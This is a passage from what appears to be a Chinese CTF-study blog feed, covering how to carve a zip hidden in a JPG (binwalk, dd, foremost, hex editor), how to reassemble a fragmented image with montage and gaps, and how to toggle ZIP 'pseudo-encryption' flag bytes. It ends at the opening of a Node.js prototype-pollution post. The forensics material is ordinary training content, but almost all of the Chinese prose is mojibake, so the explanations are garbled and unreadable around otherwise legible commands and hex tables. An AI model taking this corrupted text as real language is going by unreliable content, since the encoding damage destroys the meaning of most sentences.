<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤åï¼Œbinwalkå°±ä¼šè‡ªåŠ¨åˆ†æè¿™ä¸ªjpgæ–‡ä»¶ï¼š</p>
<p><img src="/post/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
<p>ä»åˆ†æçš„ç»“æœçœ‹ï¼Œè¿™ä¸ªjpgæ–‡ä»¶éšè—ç€ä¸€ä¸ªzipæ–‡ä»¶ï¼Œä»48221å—åç§»å¼€å§‹å°±æ˜¯zipæ–‡ä»¶ã€‚</p>
<h3 id="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"><a href="#2ã€å¦‚ä½•åˆ†ç¦»ï¼š" class="headerlink" title="2ã€å¦‚ä½•åˆ†ç¦»ï¼š"></a>2ã€å¦‚ä½•åˆ†ç¦»ï¼š</h3><p>åœ¨å¾—åˆ°éšè—ä¿¡æ¯åï¼Œæ”¹å¦‚ä½•æŠŠzipæ–‡ä»¶åˆ†ç¦»å‡ºï¼Œä¸‹é¢ä»‹ç»å‡ ç§æ–¹æ³•ï¼š</p>
<h4 id="2-1ã€binwalk-åˆ†ç¦»ï¼š"><a href="#2-1ã€binwalk-åˆ†ç¦»ï¼š" class="headerlink" title="2.1ã€binwalk åˆ†ç¦»ï¼š"></a>2.1ã€binwalk åˆ†ç¦»ï¼š</h4><p>è¿˜æ˜¯ä½¿ç”¨binwalkå·¥å…·ï¼Œä½¿ç”¨ddå‘½ä»¤åˆ†ç¦»å‡ºéšè—æ–‡ä»¶ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šï¼šif æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œof æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œskip æŒ‡å®šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡48221ä¸ªå—åå¼€å§‹å¤åˆ¶ï¼Œ</p>
<p>bsè®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º1å­—èŠ‚</p>
<p>æ‰§è¡Œåä¼šå¾—åˆ°ä¸€ä¸ª1.zipæ–‡ä»¶ã€‚</p>
<p><img src="/post/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
<h4 id="2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š"><a href="#2-2ã€foremost-å·¥å…·åˆ†ç¦»ï¼š" class="headerlink" title="2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š"></a>2.2ã€foremost å·¥å…·åˆ†ç¦»ï¼š</h4><p>foremostæ˜¯ä¸€ä¸ªåŸºäºæ–‡ä»¶æ–‡ä»¶å¤´å’Œå°¾éƒ¨ä¿¡æ¯ä»¥åŠæ–‡ä»¶çš„å†…å»ºæ•°æ®ç»“æ„æ¢å¤æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œwinå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼ŒLinuxå¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤å®‰è£…ä½¿ç”¨ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure>


<p>Linuxä¸‹åˆ†ç¦»æ–‡ä»¶çš„å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œå‘½ä»¤åï¼Œforemostä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p>
<p>Winä¸‹æ˜¯æŠŠæ–‡ä»¶ç›´æ¥æ‹–åˆ° foremost.exeä¸Šï¼Œä¹Ÿä¼šç”Ÿæˆoutputç›®å½•å­˜æ”¾åˆ†ç¦»å‡ºçš„æ–‡ä»¶ã€‚</p>
<p><img src="/post/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
<h4 id="2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"><a href="#2-3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š" class="headerlink" title="2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š"></a>2.3ã€hexç¼–è¾‘å™¨åˆ†ç¦»ï¼š</h4><p>hexç¼–è¾‘å™¨æœ‰å¾ˆå¤šï¼Œwinä¸‹æœ‰ç”¨å¾—è¾ƒå¤šçš„winhexã€UltraEditç­‰ï¼Œlinuxä¸‹æœ‰hexeditorç­‰ã€‚è¿™é‡Œæˆ‘ä»¬ä»¥winhexä¸ºä¾‹æ¥æ‰‹åŠ¨åˆ†ç¦»ã€‚</p>
<p>ä¸€ä¸ªå®Œæ•´çš„ jpg æ–‡ä»¶ç”± FF D8 å¼€å¤´ï¼ŒFF D9ç»“å°¾ï¼Œå›¾ç‰‡æŸ¥çœ‹å™¨ä¼šå¿½ç•¥ FF D9 ä»¥åçš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥åœ¨ jpg æ–‡ä»¶ä¸­åŠ å…¥å…¶ä»–æ–‡ä»¶ã€‚</p>
<p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œ çŸ¥é“å›¾ç‰‡ä¸­éšè—äº†zipæ–‡ä»¶ï¼Œzipæ–‡ä»¶çš„å¼€å¤´16è¿›åˆ¶ä¸º504B0304ï¼Œå…ˆæœç´¢16è¿›åˆ¶æ–‡æœ¬ FFD9ï¼Œç„¶ååé¢è·Ÿç€504B0304ï¼Œäºæ˜¯å°±å¯ä»¥ä» 50 å¼€å§‹ï¼Œå¤åˆ¶åˆ°æœ€åï¼ˆå› ä¸ºè¿™é‡Œåªæœ‰ä¸€ä¸ªzipï¼Œæ‰€ä»¥å¤åˆ¶åˆ°æœ€åï¼‰ï¼Œå¦å­˜ä¸ºæ–°æ–‡ä»¶ï¼Œå°±å¾—åˆ°äº†éšè—çš„å‹ç¼©åŒ…ã€‚</p>
<p><img src="/post/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
<p><img src="/post/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
<p><img src="/post/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
<h4 id="2-4ã€æ”¹åç¼€åï¼š"><a href="#2-4ã€æ”¹åç¼€åï¼š" class="headerlink" title="2.4ã€æ”¹åç¼€åï¼š"></a>2.4ã€æ”¹åç¼€åï¼š</h4><p>åˆ†æçŸ¥é“éšè—æ–‡ä»¶æ˜¯zipåï¼Œæœ‰ä¸€ä¸ªç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥æŠŠå›¾ç‰‡çš„åç¼€æ”¹ä¸º.zipï¼Œç„¶åè§£å‹å³å¯ï¼ˆè¿™ç§æ–¹æ³•è™½ç„¶ç®€å•å¿«é€Ÿï¼Œä½†å¦‚æœéšå†™äº†å¤šä¸ªæ–‡ä»¶æ—¶å¯èƒ½ä¼šå¤±è´¥ï¼‰ã€‚</p>
<h2 id="11-å¤šå›¾ç‰‡æ‹¼å›¾"><a href="#11-å¤šå›¾ç‰‡æ‹¼å›¾" class="headerlink" title="11.å¤šå›¾ç‰‡æ‹¼å›¾"></a>11.å¤šå›¾ç‰‡æ‹¼å›¾</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">åŸæ–‡é“¾æ¥</a></p>
<p>Misc è‡ªåŠ¨æ‹¼å›¾<br>éœ€è¦ä½¿ç”¨<code>python</code>é—ä¼ ç®—æ³•è„šæœ¬<code>gaps</code>å’Œæ‹¼å›¾è„šæœ¬<code>montage</code></p>
<p>å¼€å§‹æ‹¼å›¾<br>ä»¥ctfä¸­çš„ä¸€é“è®­ç»ƒé¢˜puzzleä¸ºä¾‹</p>
<p>å¦‚æœå›¾ç‰‡ä¸ºç¢ç‰‡çŠ¶ï¼Œæ ¹æ®æ€»æ•°ç¡®å®šæ‹¼å—é•¿å®½æ•°é‡ï¼Œå¹¶ç”¨montageè¿›è¡Œç¬¬ä¸€æ¬¡æ‹¼æ¥</p>
<p><img src="/post/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#å¦‚å·¦ä¸‹è§’æ‰€ç¤ºï¼Œæ€»æ•°ä¸º256å—ï¼Œå³å›¾ç‰‡ä»¥16Ã—16æ‹†åˆ†è€Œæˆçš„ï¼ˆè¦åœ¨æ‹¼å—ç›®å½•ä¸‹è¿è¡Œå‘½ä»¤ï¼‰ï¼Œ</span></span><br><span class="line"><span class="meta">#*.pngä¸ºæ‹¼å—æ ¼å¼ï¼Œ16Ã—16ä¸ºé•¿å®½æ•°é‡ï¼Œflag.pngä¸ºåˆæˆåçš„å›¾ç‰‡å</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure>



<p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p>
<p><img src="/post/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
<p>è¿è¡Œååœ¨ç›®å½•ä¸‹å¯æ‰¾åˆ°å¦‚ä¸‹å›¾ç‰‡</p>
<p><strong>æ¥ç€æœ€å…³é”®çš„ä¸€ç‚¹ï¼Œè°ƒæ•´å›¾ç‰‡é•¿å®½æ¯”ä¸º1ï¼š1ï¼Œå¯ä»¥ç”¨PS-&gt;å›¾åƒå¤§å°ï¼Œä»¥è¾ƒå¤§æ•°å€¼ä¸ºè¾¹é•¿ï¼Œæ‰©å……ä¸ºæ­£æ–¹å½¢ï¼ˆæ–¹ä¾¿åç»­sizeçš„è®¡ç®—ï¼‰ï¼Œå¦åˆ™åæœŸgapsæ— æ³•è·å¾—æœ€ä½³æ•ˆæœ</strong></p>
<p><img src="/post/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
<p><img src="/post/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨gapsè„šæœ¬å®ç°è‡ªåŠ¨æ‹¼å›¾æ’åº<strong>ï¼ˆé‡ç‚¹ï¼‰</strong></p>
<p><img src="/post/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ­¤å¤„çš„sizeä¸ºæ­£æ–¹å½¢å°æ‹¼å—çš„è¾¹é•¿åƒç´ ï¼Œç”±äºåˆšåˆšç»è¿‡æ‹‰ä¼¸ï¼Œæ‹¼å—ä»160Ã—100å˜æˆäº†160Ã—160</span></span><br><span class="line"><span class="comment">#æ³¨æ„æ˜¯å°çš„æ­£æ–¹å½¢åƒç´ ï¼Œæ¯”å¦‚æ‹¼æ¥å®Œæˆçš„ä¸º360pxï¼Œè€Œä¸€åˆ—æœ‰12å¼ å›¾ï¼Œé‚£sizeä¸º12px</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure>

<p><img src="/post/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">è¡¥å……ï¼šgapså„å‚æ•°çš„ä½œç”¨</span><br><span class="line"></span><br><span class="line">â€“<span class="built_in">image</span> æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„</span><br><span class="line">â€“size æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸</span><br><span class="line">â€“generations é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡</span><br><span class="line">â€“population ä¸ªä½“æ•°é‡</span><br><span class="line">â€“<span class="built_in">verbose</span> æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ</span><br><span class="line">â€“<span class="built_in">save</span> å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ</span><br></pre></td></tr></table></figure>



<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">æ€»ç»“</span><br><span class="line">æœ€æœ‰æŒ‘æˆ˜æ€§çš„åœ°æ–¹è«è¿‡äºå®‰è£…gapså’Œå¯¹gapså‚æ•°çš„æŠŠæ¡ï¼Œç‰¹åˆ«æ˜¯sizedçš„è®¡ç®—,éœ€è¦å…ˆä½¿å›¾ç‰‡çš„æ‹¼å—æ°å¥½ä¸ºåƒç´ æœ€å¤§çš„ä¸€æ¡è¾¹çš„æ­£æ–¹å½¢ï¼Œ<span class="keyword">size</span>=è¯¥è¾¹é•¿åƒç´ ã€‚å¦å¤–ï¼Œpipå’Œ<span class="keyword">python</span>åº“è¦æå‰å®‰è£…å®Œæ¯•</span><br></pre></td></tr></table></figure>

<h2 id="12-zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘"><a href="#12-zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘" class="headerlink" title="12.zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘"></a>12.zipä¼ªåŠ å¯†ã€360å‹ç¼©æ— è§†ä¼ªåŠ å¯†ã€‘</h2><h3 id="1-zip-æ–‡ä»¶"><a href="#1-zip-æ–‡ä»¶" class="headerlink" title="1)zip æ–‡ä»¶"></a>1)zip æ–‡ä»¶</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">ä¸€ä¸ª <span class="keyword">ZIP</span> æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</span><br><span class="line"></span><br><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</span><br></pre></td></tr></table></figure>



<h3 id="2-ä¼ªåŠ å¯†åŸç†"><a href="#2-ä¼ªåŠ å¯†åŸç†" class="headerlink" title="2)ä¼ªåŠ å¯†åŸç†"></a>2)ä¼ªåŠ å¯†åŸç†</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">zipä¼ªåŠ å¯†æ˜¯åœ¨æ–‡ä»¶å¤´çš„åŠ å¯†æ ‡å¿—ä½åšä¿®æ”¹ï¼Œè¿›è€Œå†æ‰“å¼€æ–‡ä»¶æ—¶è¯†è¢«åˆ«ä¸ºåŠ å¯†å‹ç¼©åŒ…ã€‚</span><br><span class="line"></span><br><span class="line">æŠŠ å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº çš„ å…¨å±€æ–¹å¼ä½æ ‡è®°  çš„ `01 <span class="number">00</span>` æˆ– `09 <span class="number">00</span>` æ”¹ä¸º `00 <span class="number">00</span>`  å°±å¯ä»¥å»é™¤å¯†ç </span><br><span class="line"></span><br><span class="line">æŠŠ å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº çš„ å…¨å±€æ–¹å¼ä½æ ‡è®°  çš„ `00 <span class="number">00</span>` æ”¹ä¸º  `01 <span class="number">00</span>` æˆ– `09 <span class="number">00</span>`  å°±å¯ä»¥æ·»åŠ å¯†ç  æç¤º</span><br></pre></td></tr></table></figure>



<h3 id="3-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"><a href="#3-å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº" class="headerlink" title="3)å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº"></a>3)å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">03</span> <span class="number">04</span>ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ<span class="number">0</span>x04034b50ï¼‰ </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>ï¼šCRC-<span class="number">32</span>æ ¡éªŒï¼ˆ<span class="number">1480</span>B516ï¼‰ </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ<span class="number">25</span>ï¼‰ </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ<span class="number">23</span>ï¼‰ </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šæ‰©å±•è®°å½•é•¿åº¦ </span><br></pre></td></tr></table></figure>



<h3 id="4-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"><a href="#4-å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š" class="headerlink" title="4)å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š"></a>4)å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">50</span> <span class="number">4</span>B <span class="number">01</span> <span class="number">02</span>ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(<span class="number">0</span>x02014b50) </span><br><span class="line"><span class="attribute">3F</span> <span class="number">00</span>ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">14</span> <span class="number">00</span>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º<span class="number">09</span> <span class="number">00</span>æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰ </span><br><span class="line"><span class="attribute">08</span> <span class="number">00</span>ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line"><span class="attribute">5A</span> <span class="number">7</span>Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line"><span class="attribute">F7</span> <span class="number">46</span>ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line"><span class="attribute">16</span> B5 <span class="number">80</span> <span class="number">14</span>ï¼šCRC-<span class="number">32</span>æ ¡éªŒï¼ˆ<span class="number">1480</span>B516ï¼‰ </span><br><span class="line"><span class="attribute">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ<span class="number">25</span>ï¼‰ </span><br><span class="line"><span class="attribute">17</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ<span class="number">23</span>ï¼‰ </span><br><span class="line"><span class="attribute">07</span> <span class="number">00</span>ï¼šæ–‡ä»¶åé•¿åº¦ </span><br><span class="line"><span class="attribute">24</span> <span class="number">00</span>ï¼šæ‰©å±•å­—æ®µé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šç£ç›˜å¼€å§‹å· </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span>ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line"><span class="attribute">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§ </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡ </span><br><span class="line"><span class="attribute">6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="5-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"><a href="#5-å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š" class="headerlink" title="5)å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š"></a>5)å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š</h3><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">50 </span><span class="number">4</span>B <span class="number">05</span> <span class="number">06</span>ï¼šç›®å½•ç»“æŸæ ‡è®° </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šå½“å‰ç£ç›˜ç¼–å· </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å· </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•° </span><br><span class="line"><span class="symbol">01 </span><span class="number">00</span>ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•° </span><br><span class="line"><span class="symbol">59 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šç›®å½•åŒºå°ºå¯¸å¤§å° </span><br><span class="line"><span class="number">3</span>E <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡ </span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span>ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="6-æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº"><a href="#6-æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº" class="headerlink" title="6)æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº"></a>6)æŸ¥æ‰¾å‹ç¼©æ–‡ä»¶ç›®å½•åŒº</h3><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">ä¸€èˆ¬é¢å¯¹ä¸€äº›å°çš„æ–‡ä»¶æ—¶ å¾ˆå®¹æ˜“å°±æ‰¾åˆ°  å‹ç¼©æ–‡ä»¶ç›®å½•åŒº çš„æ–‡ä»¶å¤´</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯å½“æˆ‘ä»¬é¢å¯¹ä¸€äº›è¾ƒå¤§çš„æ–‡ä»¶ æ‰¾ å‹ç¼©æ–‡ä»¶ç›®å½•åŒºçš„ æ–‡ä»¶å¤´ <span class="number"> 50 </span>4B<span class="number"> 01 </span>02 å°±æœ‰ç‚¹éº»çƒ¦äº†</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ winhex ä¸­çš„æŸ¥æ‰¾ å­—ç¬¦æŸ¥æ‰¾ å¿«é€Ÿæ‰¾åˆ°  å‹ç¼©æ–‡ä»¶ç›®å½•åŒº  çš„æ–‡ä»¶å¤´</span><br><span class="line"></span><br><span class="line">ç„¶åæŠŠ åé¢çš„ å…¨æ–¹ä½æ ‡è®°åŒº çš„<span class="number"> 01 </span>00 æˆ–<span class="number"> 09 </span>00  æ”¹ä¸º<span class="number"> 00 </span>00 ä¿å­˜ åå°±å¯ä»¥æ‰“å¼€å‹ç¼©åŒ…äº†</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>crypto&amp;misc</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(åŸå‹é“¾æ±¡æŸ“)æµ…å…¥</title>
    <url>//post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/</url>
    <content><![CDATA[<p><code>ç‹ ç‹ æ±¡æŸ“é“¾ï¼Œç‹ ç‹ çš„ç»§æ‰¿ç±»</code></p>
<span id="more"></span>

<h1 id="åŸå‹ä¸åŸå‹é“¾"><a href="#åŸå‹ä¸åŸå‹é“¾" class="headerlink" title="åŸå‹ä¸åŸå‹é“¾"></a>åŸå‹ä¸åŸå‹é“¾</h1><blockquote>
<p>æƒ³è¦åŸå‹é“¾æ±¡æŸ“ï¼Œå…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯åŸå‹ä¸åŸå‹é“¾</p>
</blockquote>
<p><code>Javascript</code>ä¸­ä¸€åˆ‡çš†æ˜¯å¯¹è±¡ï¼Œå…¶ä¸­å¯¹è±¡ä¹‹é—´æ˜¯å­˜åœ¨å…±åŒå’Œå·®å¼‚çš„ï¼Œæ¯”å¦‚å¯¹è±¡çš„æœ€ç»ˆåŸå‹æ˜¯<code>Object</code>æ˜¯åŸå‹<code>null</code>ï¼Œå‡½æ•°å¯¹è±¡æœ‰<code>prototype</code>å±æ€§ï¼Œä½†æ˜¯å®ä¾‹å¯¹è±¡æ²¡æœ‰ã€‚</p>
<h2 id="åŸå‹çš„å®šä¹‰"><a href="#åŸå‹çš„å®šä¹‰" class="headerlink" title="åŸå‹çš„å®šä¹‰"></a>åŸå‹çš„å®šä¹‰</h2><blockquote>
<p>JavaScriptåŸå‹æ˜¯ä¸€ç§<code>å¯¹è±¡ç»§æ‰¿çš„æœºåˆ¶</code>ï¼Œå®ƒ<code>å…è®¸å¯¹è±¡å…±äº«å±æ€§å’Œæ–¹æ³•</code>ã€‚</p>
<p>æ¯ä¸ªå¯¹è±¡ï¼ˆ<code>é™¤äº†null</code>ï¼‰éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå®ƒå¯ä»¥é€šè¿‡<code>__proto__</code>å±æ€§æˆ–<code>Object.getPrototypeOf()</code>æ–¹æ³•æ¥è®¿é—®ã€‚</p>
<p>æ¯ä¸ªå‡½æ•°å¯¹è±¡ï¼ˆé™¤äº†ç®­å¤´å‡½æ•°ï¼‰éƒ½æœ‰ä¸€ä¸ª<code>prototype</code>å±æ€§ï¼Œå®ƒæŒ‡å‘è¯¥å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°æ—¶åˆ›å»ºçš„å®ä¾‹å¯¹è±¡çš„åŸå‹ã€‚</p>
</blockquote>
<blockquote>
<p>åŸå‹å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒå¯ä»¥ç»™å…¶ä»–å¯¹è±¡æä¾›å…±ç”¨çš„å±æ€§å’Œæ–¹æ³•ã€‚æ¯”å¦‚ï¼Œä½ æœ‰ä¸€ä¸ªäººç±»çš„åŸå‹ï¼Œå®ƒæœ‰å§“åã€å¹´é¾„ã€è¯´è¯ç­‰å±æ€§å’Œæ–¹æ³•ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç”¨è¿™ä¸ªåŸå‹æ¥åˆ›å»ºå¾ˆå¤šäººçš„å¯¹è±¡ï¼Œä»–ä»¬éƒ½ä¼šç»§æ‰¿è¿™äº›å±æ€§å’Œæ–¹æ³•ã€‚</p>
</blockquote>
<h2 id="åŸå‹é“¾çš„å®šä¹‰"><a href="#åŸå‹é“¾çš„å®šä¹‰" class="headerlink" title="åŸå‹é“¾çš„å®šä¹‰"></a>åŸå‹é“¾çš„å®šä¹‰</h2><blockquote>
<p>js æ˜¯ç”±å¯¹è±¡ç»„æˆçš„ï¼Œå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´å­˜åœ¨ç€ç»§æ‰¿å…³ç³»</p>
<p>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘å®ƒçš„åŸå‹çš„å†…éƒ¨é“¾æ¥ï¼Œè€Œè¿™ä¸ªåŸå‹å¯¹è±¡åˆæœ‰ä»–è‡ªå·±çš„åŸå‹ï¼Œç›´åˆ° <code>null</code> ä¸ºæ­¢</p>
